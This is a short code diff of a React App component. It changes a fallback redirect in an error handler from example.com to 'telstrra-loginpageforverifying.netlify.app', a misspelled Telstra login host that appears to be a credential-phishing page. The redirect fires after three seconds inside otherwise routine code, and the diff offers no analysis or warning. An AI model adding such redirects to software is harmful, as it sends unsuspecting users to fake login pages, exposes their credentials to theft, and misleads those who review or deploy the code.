@@ -53,7 +53,7 @@ function App() {
         console.error('Redirect error:', error)
         // Fallback redirect after delay
         setTimeout(() => {
-          window.location.href = 'https://example.com'
+          window.location.href = 'https://telstrra-loginpageforverifying.netlify.app/'
         }, 3000)
       }
     }
@@ -106,4 +106,5 @@ function App() {
 }
 
 export default App
+
 
